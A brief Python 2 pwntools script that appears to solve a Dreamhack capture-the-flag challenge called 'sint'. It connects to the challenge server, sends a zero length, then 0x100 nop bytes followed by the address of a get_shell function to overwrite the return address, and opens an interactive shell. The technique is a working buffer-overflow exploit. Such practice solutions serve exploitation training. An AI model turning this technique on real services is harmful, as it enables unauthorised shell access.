#!/usr/bin/env python2

from pwn import *

HOST = "host1.dreamhack.games"
PORT = 10129

e = ELF("./sint")
c = remote(HOST, PORT)

c.sendline(str(0))
c.sendline(asm("nop")*0x100+p32(e.symbols["get_shell"]))
c.interactive()
